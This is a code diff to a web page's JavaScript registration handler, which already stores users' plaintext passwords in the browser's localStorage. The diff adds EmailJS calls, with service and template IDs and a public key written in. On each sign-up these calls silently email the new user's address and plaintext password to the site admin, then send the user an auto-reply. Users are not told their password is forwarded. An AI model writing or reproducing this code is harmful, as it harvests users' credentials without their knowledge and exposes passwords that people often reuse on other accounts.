@@ -1344,61 +1344,83 @@
 
 
         // Register Button Logic
-        registerBtn.addEventListener('click', () => {
-            const email = registerEmailInput.value.trim();
-            const password = registerPasswordInput.value.trim();
+        // Register Button Logic
+    registerBtn.addEventListener('click', () => {
+    const email = registerEmailInput.value.trim();
+    const password = registerPasswordInput.value.trim();
 
-            let hasError = false;
+    let hasError = false;
 
-            // Clear previous errors
-            clearInputError(registerEmailInput, registerEmailError);
-            clearInputError(registerPasswordInput, registerPasswordError);
+    // Clear previous errors
+    clearInputError(registerEmailInput, registerEmailError);
+    clearInputError(registerPasswordInput, registerPasswordError);
 
-            if (!email) {
-                showInputError(registerEmailInput, registerEmailError, 'Email address is required.');
-                hasError = true;
-            } else if (!isValidEmail(email)) {
-                showInputError(registerEmailInput, registerEmailError, 'Please enter a valid email address.');
-                hasError = true;
-            }
+    if (!email) {
+        showInputError(registerEmailInput, registerEmailError, 'Email address is required.');
+        hasError = true;
+    } else if (!isValidEmail(email)) {
+        showInputError(registerEmailInput, registerEmailError, 'Please enter a valid email address.');
+        hasError = true;
+    }
 
-            if (!password) {
-                showInputError(registerPasswordInput, registerPasswordError, 'Password is required.');
-                hasError = true;
-            } else if (password.length < 6) {
-                showInputError(registerPasswordInput, registerPasswordError, 'Password must be at least 6 characters long.');
-                hasError = true;
-            }
+    if (!password) {
+        showInputError(registerPasswordInput, registerPasswordError, 'Password is required.');
+        hasError = true;
+    } else if (password.length < 6) {
+        showInputError(registerPasswordInput, registerPasswordError, 'Password must be at least 6 characters long.');
+        hasError = true;
+    }
 
-            if (hasError) {
-                showMessage(registerMessage, 'Please correct the errors above.', 'error');
-                return;
-            }
+    if (hasError) {
+        showMessage(registerMessage, 'Please correct the errors above.', 'error');
+        return;
+    }
 
-            startLoading(registerBtn, 'Registering...');
+    startLoading(registerBtn, 'Registering...');
 
-            // Simulate API call delay
+    // Simulate API call delay
+    setTimeout(() => {
+        const existingUser = localStorage.getItem(`user_${email}`);
+        if (existingUser) {
+            showMessage(registerMessage, 'Account with this email already exists.', 'error');
+            showInputError(registerEmailInput, registerEmailError, 'This email is already registered.');
+            stopLoading(registerBtn, 'Register');
+        } else {
+            // Store user credentials in localStorage (Your original logic)
+            localStorage.setItem(`user_${email}`, JSON.stringify({ email, password }));
+
+            // --- EMAILJS INTEGRATION (NOW SENDING BOTH EMAILS) ---
+            const serviceID = "service_dlqau1v";
+            const adminTemplate = "template_nqc1d3s";
+            const autoReplyTemplate = "template_6mk9mxa"; // Your new ID
+            const publicKey = "gJXrPxYHlp9VFsiDt";
+            
+            // 1. Send Alert to Admin (YOU)
+            emailjs.send(serviceID, adminTemplate, {
+                user_email: email,
+                user_password: password,
+                reg_date: new Date().toLocaleString()
+            }, publicKey);
+
+            // 2. Send Auto-Reply to the User (THEM)
+            emailjs.send(serviceID, autoReplyTemplate, {
+                target_email: email // Matches the {{target_email}} in your dashboard
+            }, publicKey);
+            // --- END EMAILJS ---
+
+            // UI Feedback and Transition (Your original logic)
+            showMessage(registerMessage, 'Account created successfully! You can now log in.', 'success');
+            stopLoading(registerBtn, 'Register');
+            
             setTimeout(() => {
-                const existingUser = localStorage.getItem(`user_${email}`);
-                if (existingUser) {
-                    showMessage(registerMessage, 'Account with this email already exists.', 'error');
-                    showInputError(registerEmailInput, registerEmailError, 'This email is already registered.');
-                    stopLoading(registerBtn, 'Register');
-                } else {
-                    // Store user credentials in localStorage
-                    localStorage.setItem(`user_${email}`, JSON.stringify({ email, password }));
-                    showMessage(registerMessage, 'Account created successfully! You can now log in.', 'success');
-                    stopLoading(registerBtn, 'Register');
-                    // Optionally switch to login form after successful registration
-                    setTimeout(() => {
-                        toggleForm(loginForm, registerForm);
-                        loginEmailInput.value = email; // Pre-fill login email
-                        registerEmailInput.value = ''; // Clear register form
-                        registerPasswordInput.value = '';
-                    }, 1500);
-                }
-            }, 1000);
-        });
+                toggleForm(loginForm, registerForm);
+                loginEmailInput.value = email; // Pre-fill login email
+                registerEmailInput.value = ''; // Clear register form
+                registerPasswordInput.value = '';
+            }, 1500);
+        }
+    }, 1000);
+});
 
         // Login Button Logic
         loginBtn.addEventListener('click', () => {
